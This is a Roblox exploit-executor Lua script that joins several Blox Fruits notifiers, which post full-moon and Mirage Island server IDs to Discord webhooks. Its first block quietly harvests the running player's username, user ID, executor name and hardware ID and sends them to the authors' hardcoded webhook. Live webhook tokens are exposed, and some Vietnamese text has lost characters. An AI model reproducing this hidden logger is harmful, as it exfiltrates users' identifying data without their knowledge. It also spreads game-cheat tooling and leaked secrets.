local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

repeat wait() until game:IsLoaded()

local player = Players.LocalPlayer


local displayName = player.DisplayName
local username = player.Name
local userId = tostring(player.UserId)
local placeId = tostring(game.PlaceId)
local jobId = tostring(game.JobId)
local executor = identifyexecutor and identifyexecutor() or "Không xác nh"
local hwid = gethwid and gethwid() or "Không ly c"


local joinScript = string.format(
    'game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s", game.Players.LocalPlayer)',
    placeId,
    jobId
)


local webhookUrl = "https://discord.com/api/webhooks/1377149995379327137/BWVy-I3niNxllYsJQXpfVpWYwJe9-tELYB1J4RraTFSqOBBhkq81D_WnnQ9VaO8Qk6e9" 


local embed = {
    title = "Thông Tin Tài Khon Roblox",
    color = 0x00FFFF, 
    fields = {
        { name = "Tên hin th", value = "`" .. displayName .. "`", inline = false },
        { name = " Tên ngi dùng", value = "`" .. username .. "`", inline = false },
        { name = " User ID", value = "`" .. userId .. "`", inline = false },
        { name = "Executor", value = "`" .. executor .. "`", inline = false },
        { name = " HWID", value = "`" .. hwid .. "`", inline = false },
        { name = " Place ID", value = "`" .. placeId .. "`", inline = false },
        { name = " Job ID", value = "`" .. jobId .. "`", inline = false },
        { name = " Script Hop", value = "```lua\n" .. joinScript .. "\n```", inline = false },
        { name = " Trng thái", value = "**+1 bé dùng script **\n *Cm n Chúng Mày*", inline = false }
    }
}


local payload = {
    embeds = {embed}
}

local requestFunc =
    (syn and syn.request) or
    (http and http.request) or
    (fluxus and fluxus.request) or
    (krnl and krnl.request)

if requestFunc then
    local success, err = pcall(function()
        requestFunc({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if success then
        print(" ã gi webhook thành công!")
    else
        warn(" Li gi webhook:", err)
    end
else
    warn(" Executor không h tr HTTP Request!")
end


local webhookUrl = "https://discord.com/api/webhooks/1377358144212303882/GF2pTuPGGeXpf25-9t3aD-nkJGEnfbyRSJJRzIarj3xItPkyC_tZY3RvAB8LdBgxwJ5I"


local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")


if game.PlaceId ~= 7449423635 then return end


local alreadySent = false


local function getMoonTimer(phase)
    if phase == 5 then
        return " **FULL MOON!**"
    elseif phase == 4 then
        return " **Sp Trng Tròn (~1 phút)**"
    elseif phase == 3 then
        return " **Còn ~2 phút na**"
    else
        return " **Còn lâu mi ti trng tròn**"
    end
end


local function sendWebhook()
    local moonPhase = Lighting:GetAttribute("MoonPhase") or 0
    local jobId = game.JobId
    local serverPlayerCount = #Players:GetPlayers()

    local message = {
        ["username"] = "PHUCMAX&VINH",
        ["embeds"] = {{
            ["title"] = " Full Moon Server Found [THIRD SEA]",
            ["color"] = 16776960,
            ["fields"] = {
                {
                    ["name"] = " Full Moon Status:",
                    ["value"] = getMoonTimer(moonPhase),
                    ["inline"] = true
                },
                {
                    ["name"] = " Players:",
                    ["value"] = serverPlayerCount .. "/12",
                    ["inline"] = true
                },
                {
                    ["name"] = " Moon Phase:",
                    ["value"] = tostring(moonPhase) .. "/5",
                    ["inline"] = true
                },
                {
                    ["name"] = " JobId:",
                    ["value"] = "```" .. jobId .. "```",
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "PHUCMAX & VINH | " .. os.date("%d/%m/%Y %H:%M:%S")
            }
        }}
    }

    local request = syn and syn.request or http_request or request or (http and http.request)
    if request then
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(message)
        })
    end
end


task.spawn(function()
    while true do
        local moonPhase = Lighting:GetAttribute("MoonPhase") or 0
        if moonPhase == 5 and not alreadySent then
            sendWebhook()
            alreadySent = true
        elseif moonPhase ~= 5 then
            alreadySent = false
        end
        task.wait(10)
    end
end)


local webhookUrl = "https://discord.com/api/webhooks/1377483842163835021/mpEmwwBgiQQxDGHkURN-tJpxGFR3G1gUBf1MHX5ZsKeabcI3-Dq9ODZPQr0hjhL6x_iM"


local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")


local player = Players.LocalPlayer
local jobId = game.JobId
local placeId = game.PlaceId
local playerCount = #Players:GetPlayers()
local timeOfDay = Lighting.TimeOfDay
local hasMirage = workspace:FindFirstChild("Mirage Island") ~= nil


local message = {
    ["username"] = "PHUCMAX&VINH",
    ["embeds"] = {{
        ["title"] = " Mirage Notify",
        ["color"] = 7419530,
        ["fields"] = {
            {
                ["name"] = "Spawn:",
                ["value"] = hasMirage and " **ã xut hin!**" or " **Cha thy Mirage**",
                ["inline"] = true
            },
            {
                ["name"] = " Time Of Day:",
                ["value"] = timeOfDay,
                ["inline"] = true
            },
            {
                ["name"] = " Players:",
                ["value"] = playerCount.."/12",
                ["inline"] = true
            },
            {
                ["name"] = " Job-ID:",
                ["value"] = "```"..jobId.."```",
                ["inline"] = false
            },
            {
                ["name"] = " Script Join:",
                ["value"] = "```lua\ngame:GetService(\"ReplicatedStorage\").__ServerBrowser:InvokeServer(\"teleport\", \""..jobId.."\")\n```",
                ["inline"] = false
            }
        },
        ["footer"] = {
            ["text"] = "PHUCMAX&VINH | "..os.date("%d/%m/%Y %H:%M:%S")
        }
    }}
}


local function sendWebhook()
    local req = syn and syn.request or http_request or request or (http and http.request)
    if req then
        req({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(message)
        })
    end
end

if hasMirage then
    sendWebhook()
end

local objectName = "Mirage" 
local webhookUrl = "https://discord.com/api/webhooks/1377483842163835021/mpEmwwBgiQQxDGHkURN-tJpxGFR3G1gUBf1MHX5ZsKeabcI3-Dq9ODZPQr0hjhL6x_iM" -- Thay webhook bn vào ây


local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local player = Players.LocalPlayer
local jobId = game.JobId
local placeId = game.PlaceId


local function getTimeOfDay()
    local time = tonumber(Lighting.ClockTime)
    if time >= 5 and time < 12 then
        return " Bui sáng"
    elseif time >= 12 and time < 18 then
        return " Bui chiu"
    else
        return " Bui ti"
    end
end


local function sendWebhook()
    local message = {
        ["username"] = " phucmax&vinh Mirage Notify",
        ["embeds"] = {{
            ["title"] = "**phucmax&vinh Mirage Notify**",
            ["color"] = 16753920,
            ["fields"] = {
                {["name"] = " Spawn:", ["value"] = "Mirage Island", ["inline"] = true},
                {["name"] = "Time Of Day:", ["value"] = getTimeOfDay(), ["inline"] = true},
                {["name"] = " Players:", ["value"] = tostring(#Players:GetPlayers()) .. " players", ["inline"] = true},
                {["name"] = "Job-Id:", ["value"] = "```" .. jobId .. "```", ["inline"] = false},
            },
            ["footer"] = {
                ["text"] = "phucmax&vinh | " .. os.date("Hôm nay lúc %H:%M")
            }
        }}
    }

    local request = syn and syn.request or http_request or request or (http and http.request)
    if request then
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(message)
        })
    end
end


task.wait(10) 
for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") or v:IsA("Model") then
        if v.Name:lower():find(objectName:lower()) then
            print(" Mirage Island c tìm thy:", v:GetFullName())
            sendWebhook()
            break
        end
    end
end